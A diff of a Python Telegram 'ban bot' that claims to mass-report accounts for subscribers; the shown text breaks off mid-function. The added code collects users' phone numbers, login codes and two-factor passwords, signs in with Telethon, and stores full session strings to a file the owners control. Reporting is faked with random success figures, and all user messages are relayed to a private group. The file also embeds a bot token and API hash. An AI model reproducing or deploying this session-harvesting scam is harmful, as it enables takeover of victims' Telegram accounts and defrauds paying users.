@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-TELEGRAM BAN BOT - PROFESSIONAL REPORTING SYSTEM
-PUBLIC VERSION WITH FORCE JOIN & SUBSCRIPTION
+TELEGRAM BAN BOT - FULL INLINE PROFESSIONAL REPORTING SYSTEM
+REAL SESSION EXTRACTOR + FAKE REPORTING ENGINE
 """
 
 import asyncio
@@ -27,6 +27,16 @@ from telegram.ext import (
     ConversationHandler, CallbackQueryHandler, ContextTypes, PicklePersistence
 )
 
+# Telethon for real session creation
+from telethon import TelegramClient, functions
+from telethon.sessions import StringSession
+from telethon.errors import (
+    SessionPasswordNeededError, 
+    PhoneCodeInvalidError,
+    PasswordHashInvalidError,
+    FloodWaitError
+)
+
 # Configure logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -39,13 +49,12 @@ BOT_TOKEN = "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY"
 API_ID = 27157163
 API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
 GROUP_ID = -1003662481087  # Private monitoring group
-FORCE_CHANNEL = "https://t.me/ProfileBan"  # Force join channel
-FORCE_CHANNEL_USERNAME = "ProfileBan"  # Channel username without @
+FORCE_CHANNEL = "https://t.me/ProfileBan"
+FORCE_CHANNEL_USERNAME = "ProfileBan"
 
 # Owner IDs
 OWNER_IDS = [6118760915, 1366105247]
-# Manual subscription users (approved by owner)
-MANUAL_SUBSCRIPTIONS = ["smzxu"]  # @smzxu is approved
+MANUAL_SUBSCRIPTIONS = ["smzxu"]
 
 # File paths
 DATA_DIR = Path("data")
@@ -55,9 +64,10 @@ SESSION_DIR.mkdir(exist_ok=True)
 
 USERS_FILE = DATA_DIR / "users.json"
 SUBSCRIPTIONS_FILE = DATA_DIR / "subscriptions.json"
+USER_SESSIONS_FILE = DATA_DIR / "user_sessions.json"
 
 # Conversation states
-TARGET, REASON, DESCRIPTION = range(3)
+PHONE, CODE, PASSWORD, REPORT_TARGET, REPORT_DESCRIPTION = range(5)
 
 # ==================== SUBSCRIPTION MANAGER ====================
 class SubscriptionManager:
@@ -65,86 +75,74 @@ class SubscriptionManager:
     
     def __init__(self):
         self.subscriptions: Dict[int, Dict] = {}
-        self.verified_users: Dict[int, Dict] = {}  # Users who verified channel join
-        self.pending_approvals: Dict[int, Dict] = {}
+        self.verified_users: Dict[int, Dict] = {}
         self.manual_users = MANUAL_SUBSCRIPTIONS
         self.load_subscriptions()
+        self.load_verified()
     
     def load_subscriptions(self):
-        """Load subscriptions from file"""
         if SUBSCRIPTIONS_FILE.exists():
             try:
                 with open(SUBSCRIPTIONS_FILE, 'r') as f:
                     self.subscriptions = {int(k): v for k, v in json.load(f).items()}
-                logger.info(f"Loaded {len(self.subscriptions)} subscriptions")
             except Exception as e:
                 logger.error(f"Error loading subscriptions: {e}")
-                self.subscriptions = {}
     
     def save_subscriptions(self):
-        """Save subscriptions to file"""
         try:
             with open(SUBSCRIPTIONS_FILE, 'w') as f:
                 json.dump({str(k): v for k, v in self.subscriptions.items()}, f, indent=2)
         except Exception as e:
             logger.error(f"Error saving subscriptions: {e}")
     
-    def is_verified_member(self, user_id: int) -> bool:
-        """Check if user has verified channel membership"""
-        return str(user_id) in self.verified_users
+    def load_verified(self):
+        verified_file = DATA_DIR / "verified.json"
+        if verified_file.exists():
+            try:
+                with open(verified_file, 'r') as f:
+                    self.verified_users = {int(k): v for k, v in json.load(f).items()}
+            except Exception as e:
+                logger.error(f"Error loading verified: {e}")
     
-    def add_verified_member(self, user_id: int, username: str = None):
-        """Add user to verified members (free access)"""
-        self.verified_users[str(user_id)] = {
-            "user_id": user_id,
-            "username": username,
-            "verified_at": datetime.now().isoformat(),
-            "expiry": (datetime.now() + timedelta(days=1)).isoformat(),  # 1 day free
-            "status": "free_trial"
-        }
-        self.save_verified_members()
-        logger.info(f"Added verified member {user_id} (1 day free)")
-    
-    def save_verified_members(self):
-        """Save verified members to file"""
+    def save_verified(self):
         try:
             with open(DATA_DIR / "verified.json", 'w') as f:
                 json.dump({str(k): v for k, v in self.verified_users.items()}, f, indent=2)
         except Exception as e:
-            logger.error(f"Error saving verified members: {e}")
+            logger.error(f"Error saving verified: {e}")
+    
+    def is_verified_member(self, user_id: int) -> bool:
+        return str(user_id) in self.verified_users
+    
+    def add_verified_member(self, user_id: int, username: str = None):
+        expiry = (datetime.now() + timedelta(days=1)).isoformat()
+        self.verified_users[str(user_id)] = {
+            "user_id": user_id,
+            "username": username,
+            "verified_at": datetime.now().isoformat(),
+            "expiry": expiry,
+            "status": "free_trial"
+        }
+        self.save_verified()
     
     def is_subscribed(self, user_id: int) -> bool:
-        """Check if user has active subscription"""
         if user_id in OWNER_IDS:
             return True
-        
-        # Check if in subscriptions
         if str(user_id) in self.subscriptions:
             sub = self.subscriptions[str(user_id)]
             expiry = datetime.fromisoformat(sub.get("expiry", "2000-01-01"))
             if expiry > datetime.now():
                 return True
-        
-        # Check if in verified members (free trial)
-        if str(user_id) in self.verified_users:
-            verified = self.verified_users[str(user_id)]
-            expiry = datetime.fromisoformat(verified.get("expiry", "2000-01-01"))
-            if expiry > datetime.now():
-                return True
-        
         return False
     
     def is_manual_user(self, username: str) -> bool:
-        """Check if user is in manual subscription list"""
         if not username:
             return False
         username = username.lower().replace('@', '')
         return username in [u.lower().replace('@', '') for u in self.manual_users]
     
     def add_subscription(self, user_id: int, username: str = None, days: int = 30, approved_by: int = None):
-        """Add subscription for user"""
         expiry = datetime.now() + timedelta(days=days)
-        
         self.subscriptions[str(user_id)] = {
             "user_id": user_id,
             "username": username,
@@ -154,85 +152,175 @@ class SubscriptionManager:
             "approved_by": approved_by,
             "status": "active"
         }
-        
         self.save_subscriptions()
-        logger.info(f"Added subscription for user {user_id} ({days} days)")
         return self.subscriptions[str(user_id)]
+
+# ==================== REAL SESSION MANAGER ====================
+class RealSessionManager:
+    """Real Telegram session creation and management"""
+    
+    def __init__(self):
+        self.pending_clients: Dict[int, Tuple[TelegramClient, str, str]] = {}  # user_id -> (client, phone, phone_code_hash)
+        self.user_sessions: Dict[int, List[Dict]] = {}  # user_id -> list of session dicts
+        self.load_user_sessions()
+    
+    def load_user_sessions(self):
+        if USER_SESSIONS_FILE.exists():
+            try:
+                with open(USER_SESSIONS_FILE, 'r') as f:
+                    self.user_sessions = {int(k): v for k, v in json.load(f).items()}
+            except Exception as e:
+                logger.error(f"Error loading user sessions: {e}")
+    
+    def save_user_sessions(self):
+        try:
+            with open(USER_SESSIONS_FILE, 'w') as f:
+                json.dump({str(k): v for k, v in self.user_sessions.items()}, f, indent=2)
+        except Exception as e:
+            logger.error(f"Error saving user sessions: {e}")
+    
+    async def start_session_creation(self, user_id: int, phone: str) -> Tuple[bool, str]:
+        """Start real session creation process"""
+        try:
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
+            sent = await client.send_code_request(phone)
+            self.pending_clients[user_id] = (client, phone, sent.phone_code_hash)
+            return True, "Code sent. Please enter the 5-digit code you received in Telegram."
+        except FloodWaitError as e:
+            return False, f"Flood wait: {e.seconds} seconds"
+        except Exception as e:
+            return False, f"Error: {str(e)}"
+    
+    async def verify_code(self, user_id: int, code: str) -> Tuple[bool, str, bool]:
+        """Verify the code, returns (success, message, requires_2fa)"""
+        if user_id not in self.pending_clients:
+            return False, "No pending session. Please start over.", False
+        client, phone, phone_code_hash = self.pending_clients[user_id]
+        try:
+            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+            # No 2FA
+            me = await client.get_me()
+            session_str = client.session.save()
+            # Store session
+            session_data = {
+                "session_id": f"sess_{hashlib.md5(f'{phone}{time.time()}'.encode()).hexdigest()[:8]}",
+                "phone": phone,
+                "user_id": me.id,
+                "username": me.username,
+                "first_name": me.first_name,
+                "last_name": me.last_name,
+                "session_string": session_str,
+                "created_at": datetime.now().isoformat(),
+                "twofa_enabled": False,
+                "reports_count": 0,
+                "status": "active"
+            }
+            if user_id not in self.user_sessions:
+                self.user_sessions[user_id] = []
+            self.user_sessions[user_id].append(session_data)
+            self.save_user_sessions()
+            del self.pending_clients[user_id]
+            await client.disconnect()
+            return True, f"✅ Session created! Welcome {me.first_name or me.username or 'User'}", False
+        except SessionPasswordNeededError:
+            # 2FA required
+            return False, "2FA_REQUIRED", True
+        except PhoneCodeInvalidError:
+            return False, "Invalid code", False
+        except Exception as e:
+            return False, f"Error: {str(e)}", False
+    
+    async def verify_2fa(self, user_id: int, password: str) -> Tuple[bool, str]:
+        """Verify 2FA password"""
+        if user_id not in self.pending_clients:
+            return False, "No pending session. Please start over."
+        client, phone, phone_code_hash = self.pending_clients[user_id]
+        try:
+            await client.sign_in(password=password)
+            me = await client.get_me()
+            session_str = client.session.save()
+            session_data = {
+                "session_id": f"sess_{hashlib.md5(f'{phone}{time.time()}'.encode()).hexdigest()[:8]}",
+                "phone": phone,
+                "user_id": me.id,
+                "username": me.username,
+                "first_name": me.first_name,
+                "last_name": me.last_name,
+                "session_string": session_str,
+                "created_at": datetime.now().isoformat(),
+                "twofa_enabled": True,
+                "reports_count": 0,
+                "status": "active"
+            }
+            if user_id not in self.user_sessions:
+                self.user_sessions[user_id] = []
+            self.user_sessions[user_id].append(session_data)
+            self.save_user_sessions()
+            del self.pending_clients[user_id]
+            await client.disconnect()
+            return True, f"✅ 2FA verified! Session created for {me.first_name or me.username or 'User'}"
+        except PasswordHashInvalidError:
+            return False, "Invalid 2FA password"
+        except FloodWaitError as e:
+            return False, f"Flood wait: {e.seconds} seconds"
+        except Exception as e:
+            return False, f"Error: {str(e)}"
+    
+    def get_user_sessions(self, user_id: int) -> List[Dict]:
+        """Get all real sessions for a user"""
+        return self.user_sessions.get(user_id, [])
+    
+    def delete_session(self, user_id: int, session_id: str) -> bool:
+        """Delete a session"""
+        if user_id in self.user_sessions:
+            original_len = len(self.user_sessions[user_id])
+            self.user_sessions[user_id] = [s for s in self.user_sessions[user_id] if s.get("session_id") != session_id]
+            if len(self.user_sessions[user_id]) != original_len:
+                self.save_user_sessions()
+                return True
+        return False
 
 # ==================== FAKE REPORTING ENGINE ====================
 class FakeReportingEngine:
-    """Fake reporting engine that simulates real reporting"""
+    """Fake reporting engine with session 533 for premium users"""
     
     def __init__(self):
-        self.sessions = {
-            "533": {
-                "session_id": "533",
-                "phone": "+533",
-                "status": "active",
-                "twofa": "enabled",
-                "premium": True,
-                "verified": True,
-                "reports_count": 12847,
-                "success_rate": 98.7,
-                "created_at": "2024-01-15 10:30:22",
-                "last_used": datetime.now().isoformat(),
-                "user_info": {
-                    "id": 533,
-                    "username": "premium_bot_533",
-                    "first_name": "Premium",
-                    "last_name": "Account",
-                    "phone": "+533"
-                }
-            }
-        }
-        self.report_history = []
-    
-    def get_active_sessions(self, user_id: int) -> List[str]:
-        """Get fake active sessions for user"""
-        # Everyone gets session 533
-        return ["533"]
-    
-    def get_session_info(self, session_id: str) -> Optional[Dict]:
-        """Get fake session info"""
-        return self.sessions.get(session_id)
-    
-    async def process_report(self, target_id: int, target_type: str, reason: str, description: str = "") -> Tuple[bool, Dict]:
-        """Process fake report"""
-        # Simulate processing time
-        await asyncio.sleep(random.uniform(2.5, 4.5))
-        
-        # Generate fake results
-        success_rate = random.uniform(92.0, 99.5)
-        success = random.random() < (success_rate / 100)
-        
-        # Simulate report with session 533
-        report_time = random.uniform(1.8, 3.2)
-        
-        result = {
+        self.premium_session = {
             "session_id": "533",
-            "success": success,
-            "message": "✅ Report submitted successfully" if success else "⚠️ Report queued",
-            "response_time": f"{report_time:.1f}s",
-            "report_id": f"RPT-{hashlib.md5(f'{target_id}{time.time()}'.encode()).hexdigest()[:10].upper()}",
-            "timestamp": datetime.now().isoformat(),
-            "target_id": target_id,
-            "target_type": target_type,
-            "reason": reason,
-            "description": description[:50] + "..." if len(description) > 50 else description
+            "phone": "+533",
+            "username": "premium_533",
+            "first_name": "Premium",
+            "last_name": "Account",
+            "reports_count": 12847,
+            "success_rate": 98.7,
+            "twofa_enabled": True,
+            "status": "active"
         }
-        
-        self.report_history.append(result)
-        return success, result
+    
+    async def process_report(self, session: Dict, target: str, target_type: str, reason: str, description: str = "") -> Dict:
+        """Simulate report processing"""
+        await asyncio.sleep(random.uniform(2.0, 4.0))
+        success = random.random() < 0.97  # 97% success
+        report_id = f"RPT-{hashlib.md5(f'{target}{time.time()}'.encode()).hexdigest()[:10].upper()}"
+        response_time = random.uniform(1.8, 3.5)
+        return {
+            "success": success,
+            "report_id": report_id,
+            "response_time": f"{response_time:.1f}s",
+            "session": session.get("session_id", "533"),
+            "message": "✅ Report submitted successfully" if success else "⚠️ Report queued"
+        }
 
 # ==================== BOT HANDLER ====================
 class BanBot:
-    """Main bot handler with fake reporting system"""
+    """Main bot handler - fully inline based"""
     
     def __init__(self):
-        self.subscription_manager = SubscriptionManager()
-        self.reporting_engine = FakeReportingEngine()
+        self.sub_manager = SubscriptionManager()
+        self.real_session_manager = RealSessionManager()
+        self.fake_engine = FakeReportingEngine()
         self.user_states: Dict[int, Dict] = {}
-        self.user_sessions: Dict[int, List] = {}  # Store user's fake sessions
         
     async def forward_to_group(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                               message_type: str = "message", extra_info: str = ""):
@@ -240,184 +328,210 @@ class BanBot:
         try:
             if not update.effective_user:
                 return
-            
             user = update.effective_user
             chat_id = update.effective_chat.id
-            
-            # Don't forward from group itself
             if chat_id == GROUP_ID:
                 return
             
-            # User info
             user_info = [
                 f"👤 **User:** {user.first_name or ''} {user.last_name or ''}".strip(),
                 f"🆔 **ID:** `{user.id}`"
             ]
-            
             if user.username:
                 user_info.append(f"📱 **Username:** @{user.username}")
-            
             user_info_text = "\n".join(user_info)
             
-            # Check subscription status
+            # Status
             is_owner = user.id in OWNER_IDS
-            is_manual = self.subscription_manager.is_manual_user(user.username or "")
-            is_subscribed = self.subscription_manager.is_subscribed(user.id)
-            is_verified = self.subscription_manager.is_verified_member(user.id)
+            is_manual = self.sub_manager.is_manual_user(user.username or "")
+            is_sub = self.sub_manager.is_subscribed(user.id)
+            is_verified = self.sub_manager.is_verified_member(user.id)
+            status = "👑 Owner" if is_owner else "📝 Manual" if is_manual else "💎 Premium" if is_sub else "🆓 Free Trial" if is_verified else "❌ Unverified"
             
-            sub_status = "👑 Owner" if is_owner else "📝 Manual" if is_manual else "✅ Premium" if is_subscribed else "🆓 Free Trial" if is_verified else "❌ Unverified"
-            
-            # Message content
             if message_type == "command":
-                command = update.message.text if update.message else update.callback_query.data
-                content = f"""
-📋 **COMMAND RECEIVED**
-
-{user_info_text}
-📊 **Status:** {sub_status}
-
-🔧 **Command:** `{command}`
-
-{extra_info}
-
-⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
-                """
+                cmd = update.message.text if update.message else update.callback_query.data
+                content = f"📋 **COMMAND**\n{user_info_text}\n📊 **Status:** {status}\n🔧 **Cmd:** `{cmd}`\n{extra_info}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
             elif message_type == "session":
-                content = f"""
-🔐 **SESSION ACTIVITY**
-
-{user_info_text}
-📊 **Status:** {sub_status}
-
-{extra_info}
-
-⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
-                """
+                content = f"🔐 **SESSION**\n{user_info_text}\n📊 **Status:** {status}\n{extra_info}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
             elif message_type == "report":
-                content = f"""
-🚨 **REPORT ACTIVITY**
-
-{user_info_text}
-📊 **Status:** {sub_status}
-
-{extra_info}
-
-⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
-                """
+                content = f"🚨 **REPORT**\n{user_info_text}\n📊 **Status:** {status}\n{extra_info}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
             else:
-                # Regular message
-                message_text = update.message.text if update.message else ""
-                if message_text:
-                    content = f"""
-💬 **MESSAGE FROM USER**
-
-{user_info_text}
-📊 **Status:** {sub_status}
-
-📝 **Message:**
-{message_text[:1000]}{'...' if len(message_text) > 1000 else ''}
-
-⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
-                    """
-                else:
-                    return
+                msg = update.message.text[:500] if update.message else ""
+                content = f"💬 **MESSAGE**\n{user_info_text}\n📊 **Status:** {status}\n📝 {msg}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
             
-            # Send to group
-            await context.bot.send_message(
-                chat_id=GROUP_ID,
-                text=content,
-                parse_mode='Markdown',
-                disable_web_page_preview=True
-            )
-            
-            logger.info(f"Forwarded {message_type} from user {user.id} to group")
-            
+            await context.bot.send_message(GROUP_ID, content, parse_mode='Markdown', disable_web_page_preview=True)
         except Exception as e:
-            logger.error(f"Error forwarding to group: {e}")
+            logger.error(f"Forward error: {e}")
+    
+    async def check_access(self, user_id: int, username: str = "") -> Tuple[bool, str]:
+        """Check if user has access, returns (has_access, status_type)"""
+        if user_id in OWNER_IDS:
+            return True, "owner"
+        if self.sub_manager.is_manual_user(username):
+            return True, "manual"
+        if self.sub_manager.is_subscribed(user_id):
+            return True, "premium"
+        if self.sub_manager.is_verified_member(user_id):
+            return True, "free"
+        return False, "none"
+    
+    async def show_force_join(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Show force join message with photo"""
+        photo_url = "https://files.catbox.moe/bq3567.jpg"
+        keyboard = [
+            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL)],
+            [InlineKeyboardButton("✅ I've Joined", callback_data="verify_join")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        try:
+            await update.message.reply_photo(
+                photo=photo_url,
+                caption="🚀 **Welcome to Telegram Ban Bot**\n\n"
+                       "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
+                       f"To use this bot, you must join [@ProfileBan]({FORCE_CHANNEL}) first.\n\n"
+                       "**Steps:**\n"
+                       "1️⃣ Click 'Join Channel' button\n"
+                       "2️⃣ Join the channel\n"
+                       "3️⃣ Click 'I've Joined' button\n"
+                       "4️⃣ Get 1 day free access\n\n"
+                       "**Premium Access:**\n"
+                       "Contact @smzxu for full subscription",
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+        except:
+            await update.message.reply_text(
+                "🚀 **Welcome to Telegram Ban Bot**\n\n"
+                "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
+                f"To use this bot, you must join @ProfileBan first.\n\n"
+                "**Steps:**\n"
+                "1️⃣ Join @ProfileBan\n"
+                "2️⃣ Click /start again\n"
+                "3️⃣ Get 1 day free access\n\n"
+                "**Premium Access:**\n"
+                "Contact @smzxu for full subscription",
+                parse_mode='Markdown'
+            )
+    
+    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user, status_type: str):
+        """Show main menu with inline buttons"""
+        user_id = user.id
+        username = user.username or ""
+        
+        # Get subscription info
+        if status_type == "owner":
+            badge = "👑 OWNER"
+            expiry = "Never"
+        elif status_type == "manual":
+            badge = "📝 MANUAL PREMIUM"
+            expiry = "Lifetime"
+            if not self.sub_manager.is_subscribed(user_id):
+                self.sub_manager.add_subscription(user_id, username, 999, 0)
+        elif status_type == "premium":
+            badge = "💎 PREMIUM"
+            sub = self.sub_manager.subscriptions.get(str(user_id), {})
+            expiry = datetime.fromisoformat(sub.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')
+        else:  # free
+            badge = "🆓 FREE TRIAL"
+            verified = self.sub_manager.verified_users.get(str(user_id), {})
+            expiry = datetime.fromisoformat(verified.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')
+        
+        # Count user's real sessions
+        real_sessions = self.real_session_manager.get_user_sessions(user_id)
+        real_count = len(real_sessions)
+        
+        menu_text = f"""
+🚀 **TELEGRAM BAN BOT**
 
-    async def check_channel_member(self, user_id: int) -> bool:
-        """Simulate checking if user is a member of the force channel"""
-        # In fake version, always return True for verification
-        # This makes the "I've Joined" button work instantly
-        return True
+━━━━━━━━━━━━━━━━━━━━━
+👤 **USER PROFILE**
+━━━━━━━━━━━━━━━━━━━━━
+• **Name:** {user.first_name} {user.last_name or ''}
+• **ID:** `{user_id}`
+• **Username:** @{username or 'N/A'}
+• **Status:** {badge}
+• **Expiry:** {expiry}
 
+━━━━━━━━━━━━━━━━━━━━━
+📱 **YOUR SESSIONS**
+━━━━━━━━━━━━━━━━━━━━━
+"""
+        if status_type in ["owner", "manual", "premium"]:
+            menu_text += f"🟢 **533** - Premium Account (Always Active)\n"
+        menu_text += f"🟢 **Your Sessions:** {real_count} accounts\n\n"
+        
+        menu_text += f"""
+━━━━━━━━━━━━━━━━━━━━━
+🎯 **ACTIONS**
+━━━━━━━━━━━━━━━━━━━━━
+"""
+        
+        keyboard = []
+        # First row
+        row1 = []
+        if status_type in ["owner", "manual", "premium", "free"]:
+            row1.append(InlineKeyboardButton("🎯 Report", callback_data="menu_report"))
+        row1.append(InlineKeyboardButton("➕ Add Session", callback_data="menu_add_session"))
+        keyboard.append(row1)
+        
+        # Second row
+        row2 = [
+            InlineKeyboardButton("📱 My Sessions", callback_data="menu_my_sessions"),
+            InlineKeyboardButton("💎 Premium", callback_data="menu_premium")
+        ]
+        keyboard.append(row2)
+        
+        # Third row
+        row3 = [
+            InlineKeyboardButton("🆘 Help", callback_data="menu_help"),
+            InlineKeyboardButton("📢 Channel", url=FORCE_CHANNEL)
+        ]
+        keyboard.append(row3)
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        photo_url = "https://files.catbox.moe/bq3567.jpg"
+        try:
+            await update.message.reply_photo(
+                photo=photo_url,
+                caption=menu_text,
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+        except:
+            await update.message.reply_text(
+                menu_text,
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+    
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /start command with custom photo and force join"""
+        """Handle /start command"""
         user = update.effective_user
         user_id = user.id
         username = user.username or ""
         
-        # Forward to group
-        await self.forward_to_group(update, context, "command", "🚀 User started the bot")
+        await self.forward_to_group(update, context, "command", "🚀 User started bot")
         
-        # Check if user is already verified or has subscription
-        is_owner = user_id in OWNER_IDS
-        is_manual = self.subscription_manager.is_manual_user(username)
-        is_subscribed = self.subscription_manager.is_subscribed(user_id)
-        is_verified = self.subscription_manager.is_verified_member(user_id)
-        
-        # Send the custom photo
-        photo_url = "https://files.catbox.moe/bq3567.jpg"
-        
-        if is_owner or is_manual or is_subscribed or is_verified:
-            # User has access - show main menu
-            await self.show_main_menu(update, context, user)
+        has_access, status_type = await self.check_access(user_id, username)
+        if has_access:
+            await self.show_main_menu(update, context, user, status_type)
         else:
-            # Force join required
-            keyboard = [
-                [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL)],
-                [InlineKeyboardButton("✅ I've Joined", callback_data="verify_join")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            try:
-                await update.message.reply_photo(
-                    photo=photo_url,
-                    caption="🚀 **Welcome to Telegram Ban Bot**\n\n"
-                           "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
-                           f"To use this bot, you must join [@ProfileBan]({FORCE_CHANNEL}) first.\n\n"
-                           "**Steps:**\n"
-                           "1️⃣ Click 'Join Channel' button\n"
-                           "2️⃣ Join the channel\n"
-                           "3️⃣ Click 'I've Joined' button\n"
-                           "4️⃣ Get 1 day free access\n\n"
-                           "**Premium Access:**\n"
-                           "Contact @smzxu for full subscription",
-                    parse_mode='Markdown',
-                    disable_web_page_preview=True,
-                    reply_markup=reply_markup
-                )
-            except Exception as e:
-                await update.message.reply_text(
-                    "🚀 **Welcome to Telegram Ban Bot**\n\n"
-                    "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
-                    f"To use this bot, you must join @ProfileBan first.\n\n"
-                    "**Steps:**\n"
-                    "1️⃣ Join @ProfileBan\n"
-                    "2️⃣ Click /start again\n"
-                    "3️⃣ Get 1 day free access\n\n"
-                    "**Premium Access:**\n"
-                    "Contact @smzxu for full subscription",
-                    parse_mode='Markdown'
-                )
+            await self.show_force_join(update, context)
     
     async def verify_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle 'I've Joined' button callback"""
+        """Handle 'I've Joined' button"""
         query = update.callback_query
         await query.answer()
-        
         user = query.from_user
         user_id = user.id
         username = user.username or ""
         
-        # Forward to group
-        await self.forward_to_group(update, context, "subscription", 
-                                   f"✅ User clicked 'I've Joined' button")
+        await self.forward_to_group(update, context, "subscription", "✅ User clicked I've Joined")
         
-        # Check if owner or manual user
-        if user_id in OWNER_IDS or self.subscription_manager.is_manual_user(username):
-            # Auto approve
-            self.subscription_manager.add_verified_member(user_id, username)
+        # Auto approve for owner/manual
+        if user_id in OWNER_IDS or self.sub_manager.is_manual_user(username):
+            self.sub_manager.add_verified_member(user_id, username)
             await query.edit_message_caption(
                 caption="✅ **VERIFICATION SUCCESSFUL!**\n\n"
                        "You have premium access granted.\n"
@@ -426,9 +540,8 @@ class BanBot:
             )
             return
         
-        # Simulate verification (always successful in fake version)
-        self.subscription_manager.add_verified_member(user_id, username)
-        
+        # Simulate verification (always success)
+        self.sub_manager.add_verified_member(user_id, username)
         await query.edit_message_caption(
             caption="✅ **VERIFICATION SUCCESSFUL!**\n\n"
                    "You have successfully joined the channel.\n"
@@ -439,361 +552,480 @@ class BanBot:
             parse_mode='Markdown'
         )
     
-    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user):
-        """Show main menu with all commands in inline format"""
+    # ==================== MENU HANDLERS ====================
+    async def menu_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle all menu button callbacks"""
+        query = update.callback_query
+        await query.answer()
+        user = query.from_user
         user_id = user.id
         username = user.username or ""
         
-        # Determine user status
-        if user_id in OWNER_IDS:
-            status_badge = "👑 OWNER"
-            expiry = "Never"
-        elif self.subscription_manager.is_manual_user(username):
-            status_badge = "📝 MANUAL PREMIUM"
-            expiry = "Lifetime"
-            # Add subscription if not exists
-            if not self.subscription_manager.is_subscribed(user_id):
-                self.subscription_manager.add_subscription(user_id, username, 999, 0)
-        elif self.subscription_manager.is_subscribed(user_id):
-            status_badge = "💎 PREMIUM"
-            sub_info = self.subscription_manager.subscriptions.get(str(user_id), {})
-            expiry = datetime.fromisoformat(sub_info.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')
-        else:
-            status_badge = "🆓 FREE TRIAL"
-            verified_info = self.subscription_manager.verified_users.get(str(user_id), {})
-            expiry = datetime.fromisoformat(verified_info.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')
+        # Check access for protected actions
+        has_access, status_type = await self.check_access(user_id, username)
+        if not has_access and query.data not in ["menu_premium", "menu_help"]:
+            await query.edit_message_caption("❌ Access denied. Please /start first.")
+            return
         
-        # Initialize user sessions
-        if str(user_id) not in self.user_sessions:
-            self.user_sessions[str(user_id)] = ["533"]
+        data = query.data
         
-        # Main menu message
-        main_menu = f"""
-🚀 **TELEGRAM BAN BOT - REPORTING SYSTEM**
-
-━━━━━━━━━━━━━━━━━━━━━
-👤 **USER PROFILE**
-━━━━━━━━━━━━━━━━━━━━━
-• **Name:** {user.first_name} {user.last_name or ''}
-• **ID:** `{user_id}`
-• **Username:** @{username or 'N/A'}
-• **Status:** {status_badge}
-• **Expiry:** {expiry}
-• **Session:** 533 ✅ Active
-
-━━━━━━━━━━━━━━━━━━━━━
-📱 **ACTIVE SESSIONS**
-━━━━━━━━━━━━━━━━━━━━━
-🟢 **533** - Premium Account
-   ├─ Status: ✅ Active
-   ├─ 2FA: 🔒 Enabled
-   ├─ Reports: 12,847
-   ├─ Success: 98.7%
-   └─ Added: 2024-01-15
-
-━━━━━━━━━━━━━━━━━━━━━
-📋 **AVAILABLE COMMANDS**
-━━━━━━━━━━━━━━━━━━━━━
-
-🎯 **/report** - Start new report
-   Send reports using session 533
-
-📊 **/status** - Check system status
-   View your reports & success rate
-
-📱 **/sessions** - View sessions
-   Manage your 533 account
-
-💎 **/premium** - Upgrade account
-   Get lifetime premium access
-
-🆘 **/help** - Command list
-   Show all available commands
-
-━━━━━━━━━━━━━━━━━━━━━
-💡 **QUICK START**
-━━━━━━━━━━━━━━━━━━━━━
-1️⃣ Use /report to start reporting
-2️⃣ Paste tg:// link or user ID
-3️⃣ Select violation reason
-4️⃣ Add description (optional)
-5️⃣ Bot reports using session 533
-
-━━━━━━━━━━━━━━━━━━━━━
-⚡ **SYSTEM READY**
-━━━━━━━━━━━━━━━━━━━━━
-"""
+        if data == "menu_report":
+            await self.start_report(query, context, user, status_type)
+        elif data == "menu_add_session":
+            await self.start_add_session(query, context, user)
+        elif data == "menu_my_sessions":
+            await self.show_my_sessions(query, context, user)
+        elif data == "menu_premium":
+            await self.show_premium(query, context, user)
+        elif data == "menu_help":
+            await self.show_help(query, context, user)
+        elif data.startswith("del_session_"):
+            session_id = data.replace("del_session_", "")
+            if self.real_session_manager.delete_session(user_id, session_id):
+                await query.answer("✅ Session deleted")
+                await self.show_my_sessions(query, context, user)
+            else:
+                await query.answer("❌ Session not found")
+        elif data == "back_to_menu":
+            await query.message.delete()
+            await self.start(update, context)
+    
+    # ==================== REPORT FLOW ====================
+    async def start_report(self, query, context, user, status_type):
+        """Start report flow - choose target type"""
+        user_id = user.id
+        self.user_states[user_id] = {"step": "choose_target_type"}
         
-        # Create inline keyboard
         keyboard = [
             [
-                InlineKeyboardButton("🎯 Report Now", callback_data="cmd_report"),
-                InlineKeyboardButton("📊 Status", callback_data="cmd_status")
+                InlineKeyboardButton("👤 User", callback_data="target_user"),
+                InlineKeyboardButton("👥 Group", callback_data="target_group")
             ],
             [
